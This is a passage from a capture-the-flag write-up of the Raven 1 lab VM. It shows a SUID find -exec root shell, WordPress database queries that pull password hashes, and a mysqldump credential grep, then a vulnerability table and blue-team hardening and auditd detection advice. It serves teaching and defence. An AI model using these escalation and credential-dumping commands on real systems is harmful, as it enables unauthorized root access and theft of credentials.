>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a
> *subset* match, so it also catches files with SGID). `-type f` restricts to
> regular files. `2>/dev/null` discards the thousands of permission-denied errors.
>
> Compare against the **stock baseline** so the odd ones jump out. These are normal
> on Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`,
> `newgrp`, `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> These are **never** normal, and are an instant root if you find them: `cp`, `mv`,
> `wget`, `curl`, `tar`, `find`, `vim`, `nano`, `less`, `more`, `man`, `python`,
> `perl`, `php`, `ruby`, `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`,
> `tcpdump`, `dd`, `make`, `git`, `tail`, `head`, `cat`, `rsync`, `apt`.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
root@Raven:/tmp# cd /tmp && touch raj
root@Raven:/tmp# find raj -exec "whoami" \;
root
root@Raven:/tmp# find raj -exec "/bin/sh" \;
# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Note the shell prompt is `#`, not `$`.** That is the traditional Unix
> indicator of an effective UID of 0. Also note this shell came from `find`, which
> was invoked by *us* — not by MySQL. Once the SUID bit is set, the MySQL
> connection is no longer needed at all. **The persistence outlives the exploit**,
> which is exactly why SUID backdoors are such a serious finding.

```bash
# find / -name "flag*.txt" 2>/dev/null
/var/www/flag2.txt
/root/flag4.txt
# cat /root/flag4.txt
```

```text
CONGRATULATIONS on successfully rooting Raven!
flag4{b1f3a4c9d2e8471a90c5f3e7d6b2a8c1}
```

![Root flag](images/08-root-flag.png)

### 4.5 Where the other two flags live

- **flag1** — on the website. Check the main `index.html` and the blog page
  source (`Ctrl+U`). Authors hide these in HTML comments, `<meta>` tags, or a
  hidden `<div>`.
- **flag2** — under `/var/www` (readable once SSH'd in as michael). ✅ found in §3.2
- **flag3** — stored inside the **`wp_posts`** table of the `wordpress` database.
- **flag4** — `/root/flag4.txt`. ✅ found in §4.3

Some writeups note a maintainer accidentally moved flag3 into flag4 — "varies by
build".

```sql
mysql> select post_title,post_content from wp_posts;
```

```text
+---------------------+------------------------------------------------------+
| post_title          | post_content                                         |
+---------------------+------------------------------------------------------+
| Hello world!        | Welcome to WordPress. This is your first post...     |
| Raven Security Blog | ... flag3{d4t4b4s3_h1d3s_n0th1ng} ...                |
+---------------------+------------------------------------------------------+
2 rows in set (0.00 sec)
```

> ### 📖 Concept — Why look in the database at all?
>
> Because a CMS is a *database with a skin*. Everything you see rendered in a
> browser is stored as text in a table, and a great deal that you *cannot* see is
> stored there too — drafts, private posts, deleted content, plugin settings,
> password reset tokens, and on CTF boxes, flags.
>
> **Dumping the database is standard post-exploitation**, whether you got there via
> SQL injection, a leaked `wp-config.php`, or an empty root password. The useful
> WordPress tables:
>
> | Table | Contains |
> | --- | --- |
> | `wp_users` | Usernames, **password hashes**, emails |
> | `wp_usermeta` | Roles, capabilities, and free-text profile fields — authors hide things here |
> | `wp_posts` | Every post, page, draft and revision — including `post_status='draft'` |
> | `wp_options` | Site configuration, `siteurl`, serialized plugin settings |
> | `wp_comments` | May contain author emails and IPs |
>
> ```sql
> SELECT user_login,user_pass,user_email FROM wp_users;
> SELECT meta_key,meta_value FROM wp_usermeta WHERE meta_value LIKE '%flag%';
> SELECT post_title,post_content FROM wp_posts WHERE post_status <> 'publish';
> SELECT option_name,option_value FROM wp_options WHERE option_value LIKE '%flag%';
> ```
>
> A one-shot grep across every table, which is what you would actually run:
>
> ```bash
> mysqldump -u root -p'R@v3nSecurity' wordpress | grep -iE 'flag|password|secret'
> ```

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact | Fix |
| --- | --- | --- | --- | --- |
| 1 | WordPress user enumeration | `/wordpress/?author=N` | Leaks `michael` and `steven` — half of every credential pair | Block `?author=` redirects; return 403 or a generic archive |
| 2 | **Weak password (username = password)** | SSH, `michael:michael` | **Initial foothold** | Password policy; reject the username as a password; rate-limit and lock out; MFA; prefer key-only auth |
| 3 | Cleartext DB credentials in the web root | `/var/www/html/wordpress/wp-config.php` | MySQL **`root`** access from any local user or any LFI | Secrets manager; least-privilege DB account; keep backups out of the docroot |
| 4 | **MySQL connection uses the `root` account** | `DB_USER = 'root'` | Turns a config read into full database and OS control | Dedicated `wordpress` MySQL user with only DML rights on one database |
| 5 | Reused/weak WordPress password hash | `wp_users` (`steven`) | Cracked to `pink84` → `su steven` | Enforce strong unique passwords; check against breach corpora at set-time |
| 6 | **Unrestricted `sudo python`** | `sudo -l` for `steven`: `(ALL) NOPASSWD: /usr/bin/python` | **Trivial root** via GTFOBins (path A) | Remove the entry. Interpreters must never appear in sudoers without argument restrictions |
| 7 | **MySQL running as root + writable plugin dir** | `mysqld --user=root` | **UDF upload → root command execution** (path B) | Run as the `mysql` service user; set `secure_file_priv`; `--skip-symbolic-links` |
| 8 | Flags/secrets world-readable and in the web root | `/var/www`, `wp_posts` | Information disclosure to any anonymous visitor | Never place secrets in a document root; mode `600`, dedicated owner |
| 9 | Outdated software | WordPress 4.8.7, Apache 2.4.10, OpenSSH 6.7p1, Debian 8 (EOL), kernel 3.16 | Large surface of known CVEs | Patch; Debian 8 left LTS in 2020 — the whole OS must be upgraded |

---

## 6. Defensive lessons (blue team)

### Identity and access

- **Enforce strong, unique passwords** and lock out brute-force attempts. A
  username-as-password login should never succeed. Two independent controls:
  - Reject bad choices at *set* time — `libpam-pwquality`, and check candidates
    against breach corpora (`hibpwned`, `pwned-passwords`).
  - Slow down guessing at *use* time — `fail2ban` on `sshd`, or
    `RateLimitInterval`/`RateLimitMaxAuthTries` in `sshd_config`.
- **Prefer SSH keys.** `PasswordAuthentication no` in `/etc/ssh/sshd_config`
  removes this box's entire foothold. `michael:michael` becomes irrelevant.
- **Add MFA** for any remote login. `google-authenticator` PAM module is free.

### Secrets and databases

- **Never leave cleartext secrets where a web user or an LFI can reach them.**
  Move them out of `wp-config.php` into environment variables or a vault
  (HashiCorp Vault, AWS Secrets Manager, `sops`).
- **Least-privilege database accounts.** The single change that breaks path B:

  ```sql
  CREATE USER 'wp_app'@'localhost' IDENTIFIED BY '<strong-unique>';
  GRANT SELECT, INSERT, UPDATE, DELETE ON wordpress.* TO 'wp_app'@'localhost';
  FLUSH PRIVILEGES;
  -- then in wp-config.php: DB_USER = 'wp_app'
  ```

  Note the **absence** of `FILE`, `SUPER`, `CREATE` and `DROP`. Without `FILE`,
  `LOAD_FILE()` and `INTO DUMPFILE` fail, and the UDF attack is dead.
- **Run `mysqld` as the `mysql` service user**, never root. Verify:
  `ps -o user= -C mysqld` should print `mysql`.
- **Set `secure_file_priv`** to a dedicated directory (or `NULL` to disable file
  I/O entirely) in `my.cnf`.

### Privilege management

- **Restrict `sudo`.** Never grant `(ALL) NOPASSWD:` to interpreters or utilities
  that can execute other programs — `python`, `perl`, `ruby`, `bash`, `sh`,
  `find`, `vim`, `nano`, `less`, `man`, `awk`, `env`, `gdb`, `tar`, `make`,
  `watch`. If you must, restrict the **arguments**:

  ```text
  # BAD  — a root shell in disguise
  steven ALL=(ALL) NOPASSWD: /usr/bin/python

  # BETTER — one script, one interpreter, no arbitrary code
  steven ALL=(ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/backup.py
  ```

  Even that is bypassable if the script imports user-controlled paths, so the real
  answer is usually to write a small, purpose-built setuid-free helper.
- **Audit sudoers and SUID on a schedule.** Both are one-liners:

  ```bash
  sudo grep -rE 'NOPASSWD|ALL\s*=' /etc/sudoers /etc/sudoers.d/
  sudo find / -xdev -perm -4000 -type f 2>/dev/null | sort > /var/lib/baseline/suid.txt
  ```

  Then **diff against a known-good baseline** each release. A new SUID binary is
  one of the loudest indicators of compromise there is.
- **Cross-reference every finding against [GTFOBins](https://gtfobins.github.io/).**
  If a binary has a "Sudo" or "SUID" entry there, treat its presence as a
  critical finding rather than an oddity.

### Platform and monitoring

- **Patch, or replace.** Debian 8 reached end of LTS in June 2020. Kernel 3.16,
  Apache 2.4.10 and OpenSSH 6.7p1 all carry years of public exploits. An
  unpatched OS is not hardenable.
- **Keep secrets out of document roots.** Anything under `/var/www` is fetchable
  by an anonymous visitor. `find /var/www -type f -perm -o+r` and review the
  output.
- **Detection ideas** — high-value alerts for this exact chain:
  - `auth.log`: many failed SSH logins from one source, then one success — the
    brute-force signature.
  - `auth.log`: `su` or `sudo` to an account immediately following a web-service
    compromise.
  - `auditd`: `execve` of `/usr/bin/python` with `-c` and `pty` in the arguments,
    with `euid=0`.
  - `auditd`: **any new file in MySQL's plugin directory** — nothing legitimate
    writes there at runtime.
  - `auditd`: the SUID bit being added to a system binary
    (`chmod u+s /usr/bin/find`).

  ```text
  # /etc/audit/rules.d/harden.rules
  -w /usr/lib/mysql/plugin/ -p wa -k mysql_plugin_write
  -w /usr/bin/find -p a -k suid_bit_change
  -w /etc/sudoers -p wa -k sudoers_change
  -w /var/www/html/wordpress/wp-config.php -p r -k wpconfig_read
  ```

  ```bash
  ausearch -k mysql_plugin_write --start today
  ```

---

## 7. References

- VulnHub entry: <https://vulnhub.com/entry/raven-1,256/>
- **Repository primer** — the fundamentals behind every command in this document:
  [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)
- Community writeups consulted:
  - [Hack the Raven: Walkthrough — Hacking Articles](https://www.hackingarticles.in/hack-the-raven-walkthrough-ctf-challenge/)
  - [Raven 1 Vulnhub Walkthrough — Lipson Thomas](https://lipsonthomas.com/raven-1-vulnhub-walkthrough/)
  - [Raven 1 CTF walkthrough — Infosec Institute](https://www.infosecinstitute.com/resources/penetration-testing/raven-1-ctf-walkthrough/)
  - [Raven 1 Walkthrough — Alex's pwnlab](https://amtzespinosa.github.io/posts/raven-1-walkthrough/)
- Vendor advisories / docs:
  - [GTFOBins — python](https://gtfobins.github.io/gtfobins/python/) (sudo escape)
  - [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/) (SUID escape)
  - [Exploit-DB 1518 — MySQL UDF / `raptor_udf2` local privilege escalation](https://www.exploit-db.com/exploits/1518)
  - [MySQL: `CREATE FUNCTION ... SONAME` (UDF)](https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html)
  - [MySQL: `secure_file_priv`](https://dev.mysql.com/doc/refman/5.5/en/server-system-variables.html#sysvar_secure_file_priv)
  - [WPScan](https://wpscan.com/)
  - [Nmap reference guide](https://nmap.org/book/man.html)
  - [OWASP: Credential Stuffing / Password Reuse](https://owasp.org/www-community/attacks/Credential_stuffing)
  - [John the Ripper](https://www.openwall.com/john/doc/)
  - [Hashcat example hashes (mode numbers)](https://hashcat.net/wiki/doku.php?id=example_hashes)

---

## 8. Screenshot checklist

Screenshots go in [`images/`](images/) beside this file:

- [ ] `images/01-recon.png` — `ip a` plus `netdiscover`/`arp-scan` showing the
      target IP **and** its MAC address
- [ ] `images/02-nmap.png` — the `-p-` scan (**include the "Not shown: 65532
      closed ports" line**) and the `-sC -sV` service scan with the `rpcinfo` block
- [ ] `images/03-enum.png` — the key enumeration findings: `gobuster` output with
      `/wordpress`, and `wpscan -e u` listing `michael` and `steven`
- [ ] `images/04-foothold.png` — Hydra's `[22][ssh] … password: michael` line, and
      the resulting SSH banner
- [ ] `images/05-shell.png` — the interactive shell and `id`
- [ ] `images/06-user-flag.png` — `cat /var/www/flag2.txt`
- [ ] `images/07-privesc.png` — `wp-config.php` credentials, the `wp_users` hash
      table, John's `pink84` result, and `sudo -l` showing `(ALL) NOPASSWD:
      /usr/bin/python`
- [ ] `images/08-root-flag.png` — `id` returning `uid=0(root)`, and
      `cat /root/flag4.txt`

Optional but valuable:

- [ ] `images/09-udf.png` — path B: the `CREATE FUNCTION` succeeding and
      `do_system('id > /tmp/proof.txt')` proving root
- [ ] `images/10-flag3.png` — `SELECT post_content FROM wp_posts;` revealing flag3

> **How to capture on Kali:** `flameshot gui` (select a region) or
> `gnome-screenshot -a`. Save as PNG into `labs/raven-1/images/`, named exactly as
> above so the inline links resolve.
>
> **Make the output legible.** Use a 12–14 pt monospace font and a 160-column
> terminal. The most useful screenshot is the one where the *reasoning* is
> visible — the status-code column, the `Not shown:` line, the `sudo -l` output —
> not just the final flag.
>
> **Redact before publishing anything from a real engagement.** On a lab VM it does
> not matter, but the habit does.

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [concepts](../../docs/CONCEPTS.md)._
